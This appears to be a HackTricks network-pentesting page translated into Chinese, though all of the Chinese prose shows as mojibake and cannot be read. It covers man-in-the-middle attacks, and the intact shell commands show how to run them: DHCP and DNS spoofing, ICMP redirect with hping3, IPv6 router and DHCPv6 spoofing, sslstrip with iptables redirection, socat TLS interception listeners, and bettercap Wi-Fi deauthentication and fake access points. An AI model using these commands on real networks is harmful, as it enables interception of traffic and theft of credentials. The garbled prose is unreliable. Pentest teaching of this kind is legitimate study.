**æ€ç§‘ç³»ç»Ÿå·¥ç¨‹å¸ˆå¼€å‘äº†ä¸¤ç§FHRPåè®®ï¼ŒGLBPå’ŒHSRPã€‚**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

å·²çŸ¥å­˜åœ¨ä¸‰ä¸ªç‰ˆæœ¬çš„è·¯ç”±ä¿¡æ¯åè®®ï¼ˆRIPï¼‰ï¼šRIPã€RIPv2å’ŒRIPngã€‚é€šè¿‡UDPä½¿ç”¨ç«¯å£520å‘å¯¹ç­‰æ–¹å‘é€æ•°æ®æŠ¥ï¼ŒRIPå’ŒRIPv2ï¼Œè€Œé€šè¿‡IPv6ç»„æ’­å‘UDPç«¯å£521å¹¿æ’­æ•°æ®æŠ¥ï¼ŒRIPngã€‚RIPv2å¼•å…¥äº†MD5è®¤è¯æ”¯æŒã€‚å¦ä¸€æ–¹é¢ï¼ŒRIPngä¸åŒ…å«åŸç”Ÿè®¤è¯ï¼Œè€Œæ˜¯ä¾èµ–IPv6ä¸­çš„å¯é€‰IPsec AHå’ŒESPå¤´ã€‚

- **RIPå’ŒRIPv2ï¼š** é€šè¿‡ç«¯å£520çš„UDPæ•°æ®æŠ¥è¿›è¡Œé€šä¿¡ã€‚
- **RIPngï¼š** åˆ©ç”¨UDPç«¯å£521é€šè¿‡IPv6ç»„æ’­å¹¿æ’­æ•°æ®æŠ¥ã€‚

è¯·æ³¨æ„ï¼ŒRIPv2æ”¯æŒMD5è®¤è¯ï¼Œè€ŒRIPngä¸åŒ…å«åŸç”Ÿè®¤è¯ï¼Œä¾èµ–IPv6ä¸­çš„IPsec AHå’ŒESPå¤´ã€‚

### EIGRP æ”»å‡»

**EIGRPï¼ˆå¢å¼ºå†…éƒ¨ç½‘å…³è·¯ç”±åè®®ï¼‰**æ˜¯ä¸€ç§åŠ¨æ€è·¯ç”±åè®®ã€‚**å®ƒæ˜¯ä¸€ç§è·ç¦»çŸ¢é‡åè®®ã€‚**å¦‚æœ**æ²¡æœ‰è®¤è¯**å’Œè¢«åŠ¨æ¥å£é…ç½®ï¼Œ**å…¥ä¾µè€…**å¯ä»¥å¹²æ‰°EIGRPè·¯ç”±å¹¶å¯¼è‡´**è·¯ç”±è¡¨æ±¡æŸ“**ã€‚æ­¤å¤–ï¼ŒEIGRPç½‘ç»œï¼ˆæ¢å¥è¯è¯´ï¼Œè‡ªæ²»ç³»ç»Ÿï¼‰**æ˜¯æ‰å¹³çš„ï¼Œæ²¡æœ‰åˆ†æ®µæˆä»»ä½•åŒºåŸŸ**ã€‚å¦‚æœ**æ”»å‡»è€…æ³¨å…¥è·¯ç”±**ï¼Œè¿™æ¡è·¯ç”±å¾ˆå¯èƒ½ä¼šåœ¨è‡ªæ²»ç³»ç»Ÿä¸­**ä¼ æ’­**ã€‚

è¦æ”»å‡»EIGRPç³»ç»Ÿéœ€è¦**ä¸åˆæ³•çš„EIGRPè·¯ç”±å™¨å»ºç«‹é‚»å±…å…³ç³»**ï¼Œè¿™æ‰“å¼€äº†è®¸å¤šå¯èƒ½æ€§ï¼Œä»åŸºæœ¬çš„ä¾¦å¯Ÿåˆ°å„ç§æ³¨å…¥ã€‚

[**FRRouting**](https://frrouting.org/)å…è®¸æ‚¨å®ç°**æ”¯æŒBGPã€OSPFã€EIGRPã€RIPå’Œå…¶ä»–åè®®çš„è™šæ‹Ÿè·¯ç”±å™¨**ã€‚æ‚¨åªéœ€åœ¨æ”»å‡»è€…ç³»ç»Ÿä¸Šéƒ¨ç½²å®ƒï¼Œå®é™…ä¸Šå¯ä»¥å‡è£…æˆè·¯ç”±åŸŸä¸­çš„åˆæ³•è·¯ç”±å™¨ã€‚

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/)å…·æœ‰æ‹¦æˆªEIGRPï¼ˆå¢å¼ºå†…éƒ¨ç½‘å…³è·¯ç”±åè®®ï¼‰å¹¿æ’­çš„åŠŸèƒ½ã€‚å®ƒè¿˜å…è®¸æ³¨å…¥æ•°æ®åŒ…ï¼Œå¯ç”¨äºæ›´æ”¹è·¯ç”±é…ç½®ã€‚

### OSPF

åœ¨å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆï¼ˆOSPFï¼‰åè®®ä¸­ï¼Œ**é€šå¸¸ä½¿ç”¨MD5è®¤è¯æ¥ç¡®ä¿è·¯ç”±å™¨ä¹‹é—´çš„å®‰å…¨é€šä¿¡**ã€‚ç„¶è€Œï¼Œè¿™ç§å®‰å…¨æªæ–½å¯ä»¥é€šè¿‡Lokiå’ŒJohn the Ripperç­‰å·¥å…·æ¥ç ´è§£ã€‚è¿™äº›å·¥å…·èƒ½å¤Ÿæ•è·å’Œç ´è§£MD5å“ˆå¸Œï¼Œæš´éœ²è®¤è¯å¯†é’¥ã€‚ä¸€æ—¦è·å¾—è¯¥å¯†é’¥ï¼Œå°±å¯ä»¥ç”¨äºå¼•å…¥æ–°çš„è·¯ç”±ä¿¡æ¯ã€‚ä¸ºäº†é…ç½®è·¯ç”±å‚æ•°å¹¶å»ºç«‹å—æŸå¯†é’¥ï¼Œåˆ†åˆ«ä½¿ç”¨ _Injection_ å’Œ _Connection_ é€‰é¡¹å¡ã€‚

- **æ•è·å’Œç ´è§£MD5å“ˆå¸Œï¼š** ç”¨äºæ­¤ç›®çš„çš„å·¥å…·åŒ…æ‹¬Lokiå’ŒJohn the Ripperã€‚
- **é…ç½®è·¯ç”±å‚æ•°ï¼š** é€šè¿‡ _Injection_ é€‰é¡¹å¡å®Œæˆã€‚
- **è®¾ç½®å—æŸå¯†é’¥ï¼š** å¯†é’¥åœ¨ _Connection_ é€‰é¡¹å¡ä¸‹é…ç½®ã€‚

### å…¶ä»–é€šç”¨å·¥å…·å’Œèµ„æº

* [**Above**](https://github.com/c4s73r/Above)ï¼šç”¨äºæ‰«æç½‘ç»œæµé‡å¹¶æŸ¥æ‰¾æ¼æ´çš„å·¥å…·
* æ‚¨å¯ä»¥åœ¨[æ­¤å¤„](https://github.com/Sab0tag3d/MITM-cheatsheet)æ‰¾åˆ°æœ‰å…³ç½‘ç»œæ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚

## **æ¬ºéª—**

æ”»å‡»è€…é€šè¿‡å‘é€è™šå‡çš„DHCPå“åº”é…ç½®æ–°ç½‘ç»œæˆå‘˜çš„æ‰€æœ‰ç½‘ç»œå‚æ•°ï¼ˆç½‘å…³ã€IPã€DNSï¼‰ã€‚
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARPæ¬ºéª—

æŸ¥çœ‹[å‰ä¸€èŠ‚](./#arp-spoofing)ã€‚

### ICMPé‡å®šå‘

ICMPé‡å®šå‘æ˜¯æŒ‡å‘é€ä¸€ç§ICMPæ•°æ®åŒ…ï¼Œç±»å‹ä¸º1ï¼Œä»£ç ä¸º5ï¼Œè¡¨æ˜æ”»å‡»è€…æ˜¯åˆ°è¾¾æŸä¸ªIPåœ°å€çš„æœ€ä½³è·¯å¾„ã€‚ç„¶åï¼Œå½“å—å®³è€…æƒ³è¦è”ç³»è¯¥IPæ—¶ï¼Œæ•°æ®åŒ…ä¼šé€šè¿‡æ”»å‡»è€…å‘é€ã€‚
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNSæ¬ºéª—

æ”»å‡»è€…å°†è§£æå—å®³è€…è¯·æ±‚çš„ä¸€äº›ï¼ˆæˆ–å…¨éƒ¨ï¼‰åŸŸåã€‚
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**ä½¿ç”¨dnsmasqé…ç½®è‡ªå·±çš„DNS**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### æœ¬åœ°ç½‘å…³

é€šå¸¸å­˜åœ¨å¤šæ¡é€šå¾€ç³»ç»Ÿå’Œç½‘ç»œçš„è·¯ç”±ã€‚åœ¨æ„å»ºæœ¬åœ°ç½‘ç»œä¸­çš„MACåœ°å€åˆ—è¡¨åï¼Œä½¿ç”¨ _gateway-finder.py_ æ¥è¯†åˆ«æ”¯æŒIPv4è½¬å‘çš„ä¸»æœºã€‚
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [æ¬ºéª— LLMNRã€NBT-NS å’Œ mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

åœ¨ DNS æŸ¥è¯¢å¤±è´¥æ—¶ï¼ŒMicrosoft ç³»ç»Ÿä¾èµ–äº**é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æ (LLMNR)** å’Œ**NetBIOS åç§°æœåŠ¡ (NBT-NS)** æ¥è¿›è¡Œæœ¬åœ°ä¸»æœºè§£æã€‚åŒæ ·ï¼Œ**Apple Bonjour** å’Œ**Linux é›¶é…ç½®** å®ç°åˆ©ç”¨**å¤šæ’­ DNS (mDNS)** æ¥å‘ç°ç½‘ç»œä¸­çš„ç³»ç»Ÿã€‚ç”±äºè¿™äº›åè®®çš„éèº«ä»½éªŒè¯æ€§è´¨ä»¥åŠå®ƒä»¬é€šè¿‡ UDP å¹¿æ’­æ¶ˆæ¯è¿›è¡Œæ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒä»¬å°†ç”¨æˆ·é‡å®šå‘åˆ°æ¶æ„æœåŠ¡ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ Responder æ¨¡æ‹Ÿè¢«ä¸»æœºæœç´¢çš„æœåŠ¡ï¼Œå‘é€è™šå‡å“åº”ã€‚\
é˜…è¯»æ›´å¤šå…³äº[å¦‚ä½•ä½¿ç”¨ Responder æ¨¡æ‹ŸæœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)çš„ä¿¡æ¯ã€‚

### [æ¬ºéª— WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

æµè§ˆå™¨é€šå¸¸ä½¿ç”¨**Web ä»£ç†è‡ªåŠ¨å‘ç° (WPAD) åè®®æ¥è‡ªåŠ¨è·å–ä»£ç†è®¾ç½®**ã€‚è¿™æ¶‰åŠä»æœåŠ¡å™¨è·å–é…ç½®è¯¦ç»†ä¿¡æ¯ï¼Œå…·ä½“æ¥è¯´æ˜¯é€šè¿‡ URLï¼Œå¦‚ "http://wpad.example.org/wpad.dat"ã€‚å®¢æˆ·ç«¯å‘ç°æ­¤æœåŠ¡å™¨å¯ä»¥é€šè¿‡å„ç§æœºåˆ¶å®ç°ï¼š

- é€šè¿‡ **DHCP**ï¼Œå…¶ä¸­é€šè¿‡ä½¿ç”¨ç‰¹æ®Šä»£ç  252 æ¡ç›®æ¥ä¿ƒè¿›å‘ç°ã€‚
- é€šè¿‡ **DNS**ï¼Œè¿™æ¶‰åŠåœ¨æœ¬åœ°åŸŸä¸­æœç´¢æ ‡è®°ä¸º _wpad_ çš„ä¸»æœºåã€‚
- é€šè¿‡ **Microsoft LLMNR å’Œ NBT-NS**ï¼Œè¿™æ˜¯åœ¨ DNS æŸ¥è¯¢ä¸æˆåŠŸçš„æƒ…å†µä¸‹ä½¿ç”¨çš„åå¤‡æœºåˆ¶ã€‚

å·¥å…· Responder åˆ©ç”¨æ­¤åè®®å……å½“**æ¶æ„ WPAD æœåŠ¡å™¨**ã€‚å®ƒä½¿ç”¨ DHCPã€DNSã€LLMNR å’Œ NBT-NS æ¥è¯¯å¯¼å®¢æˆ·ç«¯è¿æ¥åˆ°å®ƒã€‚è¦æ·±å…¥äº†è§£å¦‚ä½•ä½¿ç”¨ Responder æ¨¡æ‹ŸæœåŠ¡ï¼Œè¯·æŸ¥çœ‹[æ­¤å¤„](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ã€‚

### [æ¬ºéª— SSDP å’Œ UPnP è®¾å¤‡](spoofing-ssdp-and-upnp-devices.md)

æ‚¨å¯ä»¥åœ¨ç½‘ç»œä¸­æä¾›ä¸åŒçš„æœåŠ¡ï¼Œè¯•å›¾**æ¬ºéª—ç”¨æˆ·**è¾“å…¥ä¸€äº›**æ˜æ–‡å‡­æ®**ã€‚æœ‰å…³æ­¤æ”»å‡»çš„**æ›´å¤šä¿¡æ¯**è¯·å‚é˜…[**æ¬ºéª— SSDP å’Œ UPnP è®¾å¤‡**](spoofing-ssdp-and-upnp-devices.md)**ã€‚**

### IPv6 é‚»å±…æ¬ºéª—

è¿™ç§æ”»å‡»ä¸ ARP æ¬ºéª—éå¸¸ç›¸ä¼¼ï¼Œä½†æ˜¯åœ¨ IPv6 ä¸–ç•Œä¸­ã€‚æ‚¨å¯ä»¥è®©å—å®³è€…è®¤ä¸ºç½‘å…³çš„ IPv6 å…·æœ‰æ”»å‡»è€…çš„ MAC åœ°å€ã€‚
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6è·¯ç”±å™¨é€šå‘Šæ¬ºéª—/æ´ªæ³›

ä¸€äº›æ“ä½œç³»ç»Ÿé»˜è®¤é…ç½®ä¸ºä»ç½‘ç»œä¸­å‘é€çš„RAæ•°æ®åŒ…ä¸­è·å–ç½‘å…³ã€‚è¦å°†æ”»å‡»è€…å£°æ˜ä¸ºIPv6è·¯ç”±å™¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCPæ¬ºéª—

é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€äº›æ“ä½œç³»ç»Ÿå°è¯•é€šè¿‡è¯»å–ç½‘ç»œä¸­çš„DHCPv6æ•°æ®åŒ…æ¥é…ç½®DNSã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ä¸€ä¸ªDHCPv6æ•°æ®åŒ…æ¥å°†è‡ªå·±é…ç½®ä¸ºDNSã€‚DHCPè¿˜ä¸ºå—å®³è€…æä¾›äº†ä¸€ä¸ªIPv6åœ°å€ã€‚
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTPï¼ˆä¼ªé€ é¡µé¢å’ŒJSä»£ç æ³¨å…¥ï¼‰

## äº’è”ç½‘æ”»å‡»

### sslStrip

åŸºæœ¬ä¸Šï¼Œè¿™ç§æ”»å‡»çš„ä½œç”¨æ˜¯ï¼Œå¦‚æœ**ç”¨æˆ·**è¯•å›¾**è®¿é—®**ä¸€ä¸ª**é‡å®šå‘åˆ°****HTTPS**ç‰ˆæœ¬çš„**HTTP**é¡µé¢ã€‚**sslStrip**å°†ä¼šä¸**å®¢æˆ·ç«¯ä¿æŒ**ä¸€ä¸ª**HTTPè¿æ¥**ï¼Œä¸**æœåŠ¡å™¨ä¿æŒ**ä¸€ä¸ª**HTTPSè¿æ¥**ï¼Œè¿™æ ·å®ƒå°±èƒ½å¤Ÿä»¥**æ˜æ–‡**æ–¹å¼**å—…æ¢**è¿æ¥ã€‚
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
æ›´å¤šä¿¡æ¯[åœ¨è¿™é‡Œ](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)ã€‚

### sslStrip+å’Œdns2proxyç”¨äºç»•è¿‡HSTS

**sslStrip+å’Œdns2proxy**ä¸**sslStrip**çš„**åŒºåˆ«**åœ¨äºï¼Œå®ƒä»¬ä¼šå°†ä¾‹å¦‚_**www.facebook.com**_ **é‡å®šå‘åˆ°**_**wwww.facebook.com**_ï¼ˆæ³¨æ„**é¢å¤–çš„**â€œ**w**â€ï¼‰ï¼Œå¹¶å°†è¯¥åŸŸçš„**åœ°å€è®¾ç½®ä¸ºæ”»å‡»è€…IP**ã€‚è¿™æ ·ï¼Œ**å®¢æˆ·ç«¯**å°†è¿æ¥åˆ°_**wwww.facebook.com**_ï¼ˆæ”»å‡»è€…ï¼‰ï¼Œä½†åœ¨å¹•å**sslstrip+**å°†é€šè¿‡httpsä¸**www.facebook.com** **ä¿æŒ**çœŸå®è¿æ¥ã€‚

è¿™ç§æŠ€æœ¯çš„**ç›®æ ‡**æ˜¯**é¿å¼€HSTS**ï¼Œå› ä¸º_**wwww**.facebook.com_ **ä¸ä¼š**ä¿å­˜åœ¨æµè§ˆå™¨çš„ç¼“å­˜ä¸­ï¼Œå› æ­¤æµè§ˆå™¨å°†è¢«æ¬ºéª—åœ¨HTTPä¸­æ‰§è¡Œ**facebookèº«ä»½éªŒè¯**ã€‚\
è¯·æ³¨æ„ï¼Œä¸ºäº†æ‰§è¡Œæ­¤æ”»å‡»ï¼Œå—å®³è€…å¿…é¡»å°è¯•æœ€åˆè®¿é—®[http://www.faceook.com](http://www.faceook.com)è€Œä¸æ˜¯httpsã€‚è¿™å¯ä»¥é€šè¿‡ä¿®æ”¹httpé¡µé¢ä¸­çš„é“¾æ¥æ¥å®Œæˆã€‚

æ›´å¤šä¿¡æ¯[åœ¨è¿™é‡Œ](https://www.bettercap.org/legacy/#hsts-bypass)ï¼Œ[åœ¨è¿™é‡Œ](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)å’Œ[åœ¨è¿™é‡Œ](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)ã€‚

**sslStripæˆ–sslStrip+ä¸å†èµ·ä½œç”¨ã€‚è¿™æ˜¯å› ä¸ºæµè§ˆå™¨ä¸­é¢„å…ˆä¿å­˜äº†HSTSè§„åˆ™ï¼Œå› æ­¤å³ä½¿ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®â€œé‡è¦â€åŸŸï¼Œä¹Ÿä¼šé€šè¿‡HTTPSè®¿é—®ã€‚æ­¤å¤–ï¼Œè¯·æ³¨æ„ï¼Œé¢„å…ˆä¿å­˜çš„è§„åˆ™å’Œå…¶ä»–ç”Ÿæˆçš„è§„åˆ™å¯ä»¥ä½¿ç”¨æ ‡å¿—** [**`includeSubdomains`**](https://hstspreload.appspot.com) **å› æ­¤ï¼Œä¹‹å‰çš„** _**wwww.facebook.com**_ **ç¤ºä¾‹å°†ä¸å†èµ·ä½œç”¨ï¼Œå› ä¸º** _**facebook.com**_ **ä½¿ç”¨å¸¦æœ‰`includeSubdomains`çš„HSTSã€‚**

TODO: easy-creds, evilgrade, metasploit, factory

## åœ¨ç«¯å£ä¸Šè¿›è¡ŒTCPç›‘å¬
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## åœ¨ç«¯å£ä¸Šè¿›è¡Œ TCP + SSL ç›‘å¬

#### ç”Ÿæˆå¯†é’¥å’Œè‡ªç­¾åè¯ä¹¦
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### ä½¿ç”¨è¯ä¹¦è¿›è¡Œç›‘å¬
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### ä½¿ç”¨è¯ä¹¦ç›‘å¬å¹¶é‡å®šå‘åˆ°ä¸»æœº
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
æœ‰æ—¶ï¼Œå¦‚æœå®¢æˆ·ç«¯æ£€æŸ¥CAæ˜¯å¦æœ‰æ•ˆï¼Œæ‚¨å¯ä»¥**æä¾›ç”±CAç­¾åçš„å…¶ä»–ä¸»æœºåçš„è¯ä¹¦**ã€‚\
å¦ä¸€ä¸ªæœ‰è¶£çš„æµ‹è¯•æ˜¯æä¾›è¯·æ±‚ä¸»æœºåä½†è‡ªç­¾åçš„è¯ä¹¦ã€‚

å…¶ä»–è¦æµ‹è¯•çš„å†…å®¹åŒ…æ‹¬å°è¯•ä½¿ç”¨éæœ‰æ•ˆCAç­¾ç½²è¯ä¹¦çš„æœ‰æ•ˆè¯ä¹¦ã€‚æˆ–è€…ä½¿ç”¨æœ‰æ•ˆçš„å…¬é’¥ï¼Œå¼ºåˆ¶ä½¿ç”¨è¯¸å¦‚Diffie Hellmanä¹‹ç±»çš„ç®—æ³•ï¼ˆä¸éœ€è¦ä½¿ç”¨çœŸå®ç§é’¥è§£å¯†ä»»ä½•å†…å®¹ï¼‰ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚çœŸå®ç§é’¥çš„æ¢æµ‹ï¼ˆå¦‚å“ˆå¸Œï¼‰æ—¶ï¼Œå‘é€ä¸€ä¸ªè™šå‡çš„æ¢æµ‹ï¼Œå¹¶æœŸæœ›å®¢æˆ·ç«¯ä¸ä¼šæ£€æŸ¥è¿™ä¸€ç‚¹ã€‚

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### ä¸»åŠ¨å‘ç°ç¬”è®°

è¯·æ³¨æ„ï¼Œå½“å‘ä¸€ä¸ªæ²¡æœ‰è¯·æ±‚ç«¯å£çš„è®¾å¤‡å‘é€UDPæ•°æ®åŒ…æ—¶ï¼Œä¼šå‘é€ä¸€ä¸ªICMPï¼ˆç«¯å£ä¸å¯è¾¾ï¼‰ã€‚

### **ARP å‘ç°**

ARPæ•°æ®åŒ…ç”¨äºå‘ç°ç½‘ç»œå†…æ­£åœ¨ä½¿ç”¨çš„IPåœ°å€ã€‚è®¡ç®—æœºå¿…é¡»ä¸ºæ¯ä¸ªå¯èƒ½çš„IPåœ°å€å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œåªæœ‰æ­£åœ¨ä½¿ç”¨çš„IPåœ°å€æ‰ä¼šå“åº”ã€‚

### **mDNSï¼ˆå¤šæ’­DNSï¼‰**

Bettercapå‘é€ä¸€ä¸ªMDNSè¯·æ±‚ï¼ˆæ¯Xæ¯«ç§’ä¸€æ¬¡ï¼‰ï¼Œè¯·æ±‚ **\_services\_.dns-sd.\_udp.local**ï¼Œé€šå¸¸ä¼šå›åº”æ­¤è¯·æ±‚çš„æœºå™¨ã€‚ç„¶åï¼Œå®ƒåªæœç´¢å›åº”â€œservicesâ€çš„æœºå™¨ã€‚

**å·¥å…·**

* Avahi-browserï¼ˆ--allï¼‰
* Bettercapï¼ˆnet.probe.mdnsï¼‰
* Responder

### **NBNSï¼ˆNetBiosåç§°æœåŠ¡å™¨ï¼‰**

Bettercapå‘ç«¯å£137/UDPå¹¿æ’­æ•°æ®åŒ…ï¼Œè¯·æ±‚åç§°ä¸ºâ€œCKAAAAAAAAAAAAAAAAAAAAAAAAAAAâ€ã€‚

### **SSDPï¼ˆç®€å•æœåŠ¡å‘ç°åè®®ï¼‰**

Bettercapå¹¿æ’­SSDPæ•°æ®åŒ…ï¼Œæœç´¢å„ç§æœåŠ¡ï¼ˆUDPç«¯å£1900ï¼‰ã€‚

### **WSDï¼ˆWebæœåŠ¡å‘ç°ï¼‰**

Bettercapå¹¿æ’­WSDæ•°æ®åŒ…ï¼Œæœç´¢æœåŠ¡ï¼ˆUDPç«¯å£3702ï¼‰ã€‚

## å‚è€ƒèµ„æ–™

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **ç½‘ç»œå®‰å…¨è¯„ä¼°ï¼šäº†è§£æ‚¨çš„ç½‘ç»œï¼ˆç¬¬3ç‰ˆï¼‰**
* **å®ç”¨ç‰©è”ç½‘é»‘å®¢æ”»å‡»æŒ‡å—ï¼šFotios Chantzisï¼ŒIoannis Staisï¼ŒPaulino Calderonï¼ŒEvangelos Deirmentzoglouï¼ŒBeau Woodè‘—**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**æ¼æ´èµé‡‘æç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**æ¼æ´èµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)ç³»åˆ—
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
